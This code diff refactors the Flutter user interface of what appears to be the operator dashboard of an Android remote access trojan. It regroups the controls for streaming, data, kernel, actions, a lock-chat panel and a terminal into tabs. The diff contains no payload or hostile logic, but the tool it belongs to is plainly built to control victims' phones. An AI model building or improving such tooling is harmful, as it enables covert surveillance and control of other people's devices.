@@ -252,8 +252,18 @@ class _RatControlPageState extends State<RatControlPage> {
   final Map<String, String> _eventSeen = {};
   final List<_TerminalEntry> _terminalLines = [];
   final ScrollController _terminalScroll = ScrollController();
+  final PageController _tabController = PageController();
+  int _currentTab = 0;
 
   static const int _maxTerminalLines = 200;
+
+  static const List<Map<String, dynamic>> _tabs = [
+    {'label': 'KONTROL', 'icon': Icons.phone_android_rounded, 'color': _green},
+    {'label': 'STREAM', 'icon': Icons.videocam_rounded, 'color': _blue2},
+    {'label': 'DATA', 'icon': Icons.storage_rounded, 'color': _purple},
+    {'label': 'KERNEL', 'icon': Icons.memory_rounded, 'color': _red},
+    {'label': 'AKSI', 'icon': Icons.bolt_rounded, 'color': _amber},
+  ];
 
   RatClient get client => widget.client;
   RatDevice? get _device =>
@@ -297,6 +307,7 @@ class _RatControlPageState extends State<RatControlPage> {
   void dispose() {
     client.removeListener(_onClient);
     _chatInput.dispose();
+    _tabController.dispose();
     super.dispose();
   }
 
@@ -507,108 +518,164 @@ class _RatControlPageState extends State<RatControlPage> {
   }
 
   Widget _buildControl(RatDevice d) {
-    return CustomScrollView(
-      physics: const BouncingScrollPhysics(),
-      slivers: [
-        SliverPadding(
-          padding: const EdgeInsets.only(top: 8),
-          sliver: SliverToBoxAdapter(child: _buildBanner(d)),
-        ),
-        if (!client.isConnected)
-          SliverToBoxAdapter(
-            child: _ConnectingBar(
-              onRetry: () {
-                client.disconnect();
-                client.connect();
-                _toast('Menyambungkan ulang...', info: true);
-              },
-            ),
-          ),
-        SliverPadding(
-          padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
-          sliver: SliverToBoxAdapter(child: _buildInfoBar(d)),
-        ),
-        SliverPadding(
-          padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
-          sliver: SliverToBoxAdapter(child: _buildDevInfo(d)),
-        ),
-        const SliverToBoxAdapter(child: _SectionTitle('Kontrol Perangkat')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverGrid(
-            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-              crossAxisCount: 2,
-              mainAxisSpacing: 10,
-              crossAxisSpacing: 10,
-              mainAxisExtent: 124,
-            ),
-            delegate: SliverChildListDelegate(_buildControlTiles(d)),
-          ),
-        ),
-        const SliverToBoxAdapter(child: _SectionTitle('Streaming')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverGrid(
-            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-              crossAxisCount: 2,
-              mainAxisSpacing: 10,
-              crossAxisSpacing: 10,
-              mainAxisExtent: 124,
-            ),
-            delegate: SliverChildListDelegate(_buildStreamTiles(d)),
-          ),
-        ),
-        const SliverToBoxAdapter(child: _SectionTitle('Storage & Info')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverGrid(
-            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-              crossAxisCount: 2,
-              mainAxisSpacing: 10,
-              crossAxisSpacing: 10,
-              mainAxisExtent: 124,
-            ),
-            delegate: SliverChildListDelegate(_buildStorageTiles(d)),
-          ),
-        ),
+    return Column(
+      children: [
+        // Persistent header
+        Expanded(
+          child: CustomScrollView(
+            physics: const BouncingScrollPhysics(),
+            slivers: [
+              SliverPadding(
+                padding: const EdgeInsets.only(top: 8),
+                sliver: SliverToBoxAdapter(child: _buildBanner(d)),
+              ),
+              if (!client.isConnected)
+                SliverToBoxAdapter(
+                  child: _ConnectingBar(
+                    onRetry: () {
+                      client.disconnect();
+                      client.connect();
+                      _toast('Menyambungkan ulang...', info: true);
+                    },
+                  ),
+                ),
+              SliverPadding(
+                padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
+                sliver: SliverToBoxAdapter(child: _buildInfoBar(d)),
+              ),
+              SliverPadding(
+                padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
+                sliver: SliverToBoxAdapter(child: _buildDevInfo(d)),
+              ),
 
-        const SliverToBoxAdapter(child: _SectionTitle('Kernel')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverGrid(
-            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-              crossAxisCount: 2,
-              mainAxisSpacing: 10,
-              crossAxisSpacing: 10,
-              mainAxisExtent: 124,
-            ),
-            delegate: SliverChildListDelegate(_buildKernelTiles(d)),
+              // Tab bar
+              SliverToBoxAdapter(
+                child: Container(
+                  margin: const EdgeInsets.fromLTRB(16, 12, 16, 0),
+                  child: Row(
+                    children: _tabs.asMap().entries.map((entry) {
+                      final i = entry.key;
+                      final tab = entry.value;
+                      final isActive = _currentTab == i;
+                      final color = tab['color'] as Color;
+                      return Expanded(
+                        child: GestureDetector(
+                          onTap: () {
+                            _tabController.animateToPage(i,
+                                duration: const Duration(milliseconds: 250),
+                                curve: Curves.easeInOut);
+                          },
+                          child: AnimatedContainer(
+                            duration: const Duration(milliseconds: 200),
+                            margin: const EdgeInsets.symmetric(horizontal: 3),
+                            padding: const EdgeInsets.symmetric(vertical: 10),
+                            decoration: BoxDecoration(
+                              color: isActive
+                                  ? color.withValues(alpha: 0.18)
+                                  : Neo.white,
+                              borderRadius: BorderRadius.circular(12),
+                              border: Border.all(
+                                color: isActive
+                                    ? color.withValues(alpha: 0.5)
+                                    : Neo.textMuted.withValues(alpha: 0.15),
+                                width: 1,
+                              ),
+                            ),
+                            child: Column(
+                              mainAxisSize: MainAxisSize.min,
+                              children: [
+                                Icon(tab['icon'] as IconData,
+                                    size: 16,
+                                    color: isActive ? color : Neo.textMuted),
+                                const SizedBox(height: 3),
+                                Text(
+                                  tab['label'] as String,
+                                  style: TextStyle(
+                                    fontFamily: 'ShareTechMono',
+                                    fontSize: 8,
+                                    letterSpacing: 1,
+                                    color: isActive ? color : Neo.textMuted,
+                                    fontWeight:
+                                        isActive ? FontWeight.w700 : FontWeight.w400,
+                                  ),
+                                ),
+                              ],
+                            ),
+                          ),
+                        ),
+                      );
+                    }).toList(),
+                  ),
+                ),
+              ),
+
+              // PageView content
+              SliverToBoxAdapter(
+                child: SizedBox(
+                  height: 520,
+                  child: PageView(
+                    controller: _tabController,
+                    physics: const BouncingScrollPhysics(),
+                    onPageChanged: (i) => setState(() => _currentTab = i),
+                    children: [
+                      _buildTabPage(_buildControlTiles(d)),
+                      _buildTabPage(_buildStreamTiles(d)),
+                      _buildTabPageWithFullWidth(
+                        gridChildren: _buildStorageTiles(d),
+                        fullChildren: [
+                          if (d.statusBool('lockChatActive'))
+                            _buildLockChatPanel(d),
+                          _buildTerminalPanel(),
+                        ],
+                      ),
+                      _buildTabPage(_buildKernelTiles(d)),
+                      _buildTabPage(_buildActionTiles(d)),
+                    ],
+                  ),
+                ),
+              ),
+
+              const SliverToBoxAdapter(child: SizedBox(height: 24)),
+            ],
           ),
         ),
-        const SliverToBoxAdapter(child: _SectionTitle('Aksi')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverGrid(
-            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-              crossAxisCount: 2,
-              mainAxisSpacing: 10,
-              crossAxisSpacing: 10,
-              mainAxisExtent: 124,
-            ),
-            delegate: SliverChildListDelegate(_buildActionTiles(d)),
-          ),
+      ],
+    );
+  }
+
+  Widget _buildTabPage(List<Widget> children) {
+    return ListView(
+      physics: const BouncingScrollPhysics(),
+      padding: const EdgeInsets.symmetric(horizontal: 16),
+      children: [
+        Wrap(
+          spacing: 10,
+          runSpacing: 10,
+          children: children,
         ),
-        if (d.statusBool('lockChatActive'))
-          SliverPadding(
-            padding: const EdgeInsets.fromLTRB(16, 20, 16, 0),
-            sliver: SliverToBoxAdapter(child: _buildLockChatPanel(d)),
-          ),
-        const SliverToBoxAdapter(child: _SectionTitle('Terminal')),
-        SliverPadding(
-          padding: const EdgeInsets.symmetric(horizontal: 16),
-          sliver: SliverToBoxAdapter(child: _buildTerminalPanel()),
+        const SizedBox(height: 16),
+      ],
+    );
+  }
+
+  Widget _buildTabPageWithFullWidth({
+    required List<Widget> gridChildren,
+    List<Widget> fullChildren = const [],
+  }) {
+    return ListView(
+      physics: const BouncingScrollPhysics(),
+      padding: const EdgeInsets.symmetric(horizontal: 16),
+      children: [
+        Wrap(
+          spacing: 10,
+          runSpacing: 10,
+          children: gridChildren,
         ),
-        const SliverToBoxAdapter(child: SizedBox(height: 24)),
+        for (final full in fullChildren) ...[
+          const SizedBox(height: 10),
+          full,
+        ],
+        const SizedBox(height: 16),
       ],
     );
   }
